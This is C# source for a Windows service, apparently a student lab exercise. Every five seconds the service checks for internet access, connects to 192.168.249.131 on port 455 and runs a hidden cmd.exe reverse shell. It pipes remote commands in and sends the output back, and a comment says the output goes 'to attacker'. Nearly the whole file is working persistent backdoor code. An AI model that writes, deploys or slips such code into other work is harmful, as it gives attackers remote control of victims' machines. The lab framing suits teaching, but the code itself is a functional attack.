using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net.NetworkInformation;
using System.Net;
using System.Runtime.InteropServices;

namespace lab1_bai3
{
    public partial class Service1 : ServiceBase
    {
        //use timers
        Timer timer = new Timer();
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds
            timer.Enabled = true;

        }


        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        public static bool CheckForInternetConnect()
		{
			try
			{
               using (var client = new WebClient())
               using (var stream = client.OpenRead("http://www.google.com/"))
				{
                    return true;
				}
			}
			catch
			{
                return false;
			}
		}

        static StreamWriter streamWriter;
        [DllImport("kernel32.dll")]

        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static void ReverseShell()
		{
            var handle = GetConsoleWindow();

			try
			{
                using (TcpClient client = new TcpClient(hostname: "192.168.249.131", port: 455))
				{
                    using (Stream stream = client.GetStream())
					{
                        using (StreamReader rdr = new StreamReader(stream))
						{
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHnadler);
                            p.Start();
                            p.BeginOutputReadLine();
							while (true)
							{
                                strInput.Append(rdr.ReadLine());

                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
							}
						}
					}
				}
			}
            catch(Exception ex)
			{
                
			}
		}

        
        private static void CmdOutputDataHnadler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // new string
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // output = output from powershell process
                    strOutput.Append(outLine.Data);
                    // send it to attacker (stream writer)
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex) { }
            }
           
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            if(CheckForInternetConnect() == true)
            { 
                WriteToFile("internet connect sussess!");
                ReverseShell();
            }
            else
                WriteToFile("No internet");
        }
    
        private void ConnectShell()
		{
            ReverseShell();
		}
        // similar to CmdOutputDataHandler
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
